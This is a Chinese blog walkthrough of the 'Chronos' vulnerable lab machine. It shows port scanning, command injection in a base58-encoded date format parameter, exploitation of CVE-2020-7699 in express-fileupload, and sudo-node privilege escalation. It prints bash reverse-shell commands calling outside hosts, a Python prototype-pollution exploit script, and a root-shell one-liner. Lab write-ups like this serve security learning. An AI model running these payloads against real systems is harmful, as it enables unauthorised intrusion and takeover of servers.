# 打靶-Chronos

<div class="has-toc have-toc">
</div>

## 0x00 准备工作

难度等级: 中  
打靶目标: 取得 2 个 flag + root 权限

涉及攻击方法:

  * 端口扫描
  * WEB侦查
  * 命令注入
  * 数据编解码
  * 搜索大法
  * 框架漏洞利用
  * 代码审计
  * NC串联
  * 本地提权

## 0x01 flag1

主机扫描，使用`netdiscover -r 10.0.2.0/24`，-r指定ip段。<figure class="wp-block-image size-full">

<img loading="lazy" width="1893" height="460" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-81.png" alt="" class="wp-image-4056" /> </figure> 

再进行端口扫描<figure class="wp-block-image size-full">

<img loading="lazy" width="2301" height="1185" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-82.png" alt="" class="wp-image-4057" /> </figure> 

Nikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，具体的使用参考<a rel="noreferrer noopener" href="https://zhuanlan.zhihu.com/p/124246499" target="_blank" rel="nofollow" >https://zhuanlan.zhihu.com/p/124246499</a>。使用`nikto -h 10.0.2.7`，扫描详细的web服务信息。Express是基于 Node.js 平台，快速、开放、极简的 Web 开发框架。 <figure class="wp-block-image size-full">

<img loading="lazy" width="2893" height="1126" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-83.png" alt="" class="wp-image-4058" /> </figure> 

下面访问下80端口的web服务<figure class="wp-block-image size-full">

<img loading="lazy" width="1808" height="600" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-84.png" alt="" class="wp-image-4060" /> </figure> 

查看下源代码，21行的js代码很可疑，不过可以看到这些函数的字符经过处理了。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-85.png" alt="" class="wp-image-4062" width="516" height="395" /> </figure> 

jsbeautify得到一条url地址，chrons.local怀疑是靶机的域名，再刷新下web页面，发现Permission Denied。<figure class="wp-block-image size-full">

<img loading="lazy" width="3082" height="1622" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-86.png" alt="" class="wp-image-4064" /> </figure> 

format后面的字符串看起来也像是base加密过的，放到cyberchef里面用magic跑一下，发现是base58加密的，然后格式很类似date命令。%A 表示星期，%B : 月份，%d表示日，%Y表示年，%H表示小时，%M表示分钟，%S表示秒。<figure class="wp-block-image size-full">

<img loading="lazy" width="1515" height="185" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-87.png" alt="" class="wp-image-4066" /> </figure> 

下面修改/etc/hosts后再次访问。<figure class="wp-block-image size-full">

<img loading="lazy" width="2127" height="453" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-88.png" alt="" class="wp-image-4068" /> </figure> 

构造`;bash -c 'bash -i >& /dev/tcp/10.0.2.4/2333 0>&1'`经过base58加密后，用bp抓包改包。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-89.png" alt="" class="wp-image-4070" width="683" height="142" /> </figure> 

虽然爆出了错误提示信息，但shell是已经连上的。<figure class="wp-block-image size-full">

<img loading="lazy" width="1875" height="683" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-90.png" alt="" class="wp-image-4072" /> </figure> 

接着进行代码审计，package.json记录当前项目所依赖模块的版本信息，package-lock.json记录了node\_modules目录下所有模块的具体来源和版本号以及其他的信息，app.js是项目的入口文件，node\_modules是安装node后用来存放用包管理工具下载安装的包的文件夹。chronos文件夹中没有找到相关的漏洞利用点，跳到opt目录，发现同级下存在 chronos-v2文件夹。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-91.png" alt="" class="wp-image-4073" width="342" height="109" /> </figure> 

跳进去看一下，backend是后端，frontend是前端，index.html是首页，看下后端的代码。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-92.png" alt="" class="wp-image-4074" width="443" height="107" /> </figure> 

发现存在一个文件上传的东西<figure class="wp-block-image size-full">

<img loading="lazy" width="1446" height="788" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-93.png" alt="" class="wp-image-4077" /> </figure> 

经过查找需要用到CVE-2020-7699，参考：<a rel="noreferrer noopener" href="https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/?cf_chl_jschl_tk=pmd_is5dI67SGF84oBx7VNrHKtOJkiFLfvwseT0ZXR2iQG8-1633955732-0-gqNtZGzNAlCjcnBszQbR" target="_blank" rel="nofollow" >https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/?<strong>cf_chl_jschl_tk</strong>=pmd_is5dI67SGF84oBx7VNrHKtOJkiFLfvwseT0ZXR2iQG8-1633955732-0-gqNtZGzNAlCjcnBszQbR</a>、<a rel="noreferrer noopener" href="https://blog.csdn.net/systemino/article/details/108099675" target="_blank" rel="nofollow" >https://blog.csdn.net/systemino/article/details/108099675</a>、<a rel="noreferrer noopener" href="https://blog.p6.is/Real-World-JS-1/" target="_blank" rel="nofollow" >https://blog.p6.is/Real-World-JS-1/</a>，且前提条件是启用"parseNested"选项，这里查看server.js的源码。<figure class="wp-block-image size-full">

<img loading="lazy" width="1542" height="989" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-95.png" alt="" class="wp-image-4079" /> </figure> 

满足条件，然后，找到的exp代码如下：

<pre class="wp-block-code"><code>import requests

cmd = 'bash -c "bash -i &> /dev/tcp/p6.is/8888 0>&1"'

# pollute
requests.post('http://p6.is:7777', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

# execute command
requests.get('http://p6.is:7777')
</code></pre>

上传到服务器，修改权限，运行反弹shell。<figure class="wp-block-image size-full">

<img loading="lazy" width="2534" height="367" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-96.png" alt="" class="wp-image-4081" /> </figure> 

查看user.txt<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-97.png" alt="" class="wp-image-4082" width="372" height="115" /> </figure> 

## 0x02 flag2

在Linux系统上进行提权通常有3种：

  * 通过内核漏洞提权
  * suid的权限配置不当
  * sudo权限配置不严谨

这次在sudo时，发现可疑点，可以在不需要密码的情况下运行npm和node命令。<figure class="wp-block-image size-full">

<img loading="lazy" width="2253" height="419" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-98.png" alt="" class="wp-image-4084" /> </figure> 

然后搜索一下node.js提权的代码。

<pre class="wp-block-code"><code>sudo node -e 'child_process.spawn("/bin/bash", {stdio: &#91;0, 1, 2]})'</code></pre>

成功提权！<figure class="wp-block-image size-full">

<img loading="lazy" width="1945" height="186" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-99.png" alt="" class="wp-image-4085" /> </figure> 

接着查看下root.txt<figure class="wp-block-image size-full">

<img loading="lazy" width="979" height="80" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-100.png" alt="" class="wp-image-4086" /> </figure>
